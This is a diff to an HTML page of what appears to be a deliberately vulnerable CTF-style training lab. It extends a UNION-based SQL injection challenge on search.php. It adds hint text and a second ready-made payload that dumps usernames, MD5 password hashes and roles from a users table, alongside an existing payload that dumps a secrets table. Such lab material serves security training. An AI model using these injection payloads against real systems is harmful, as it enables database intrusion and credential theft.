@@ -36,9 +36,12 @@ Full walkthroughs are in <code>SOLUTIONS.md</code>.</p></div>
 
 <!-- 1. SQLi -->
 <div class="card"><h2>1 · <code>search.php?q=</code> <span class="flag-pill">🏁 UNION SQLi</span></h2>
-  <p class="muted">Product search. The query has 3 columns; dump the <code>secrets</code> table.</p>
+  <p class="muted">Product search. The query has 3 columns. Enumerate <code>information_schema</code> → dump
+     the <code>secrets</code> table (flag) and the <code>users</code> table (crackable MD5 hashes).</p>
   <details><summary>💡 hint</summary><code class="pl" id="pl_q">zzz%' UNION SELECT k,v,3 FROM secrets-- -</code>
-    <button type="button" class="ghost" onclick="fill('in_q','pl_q')">use this ▶</button></details>
+    <button type="button" class="ghost" onclick="fill('in_q','pl_q')">use this ▶</button>
+    <code class="pl" id="pl_q2">zzz%' UNION SELECT GROUP_CONCAT(username,0x3a,password,0x3a,role SEPARATOR 0x0a),2,3 FROM users-- -</code>
+    <button type="button" class="ghost" onclick="fill('in_q','pl_q2')">use this (dump users) ▶</button></details>
   <form method="get" action="search.php" target="r_q" onsubmit="show('r_q')">
     <input type="text" id="in_q" name="q" placeholder="type your SQLi payload…"><button>Run ▶</button></form>
   <iframe name="r_q" id="r_q" class="res"></iframe></div>
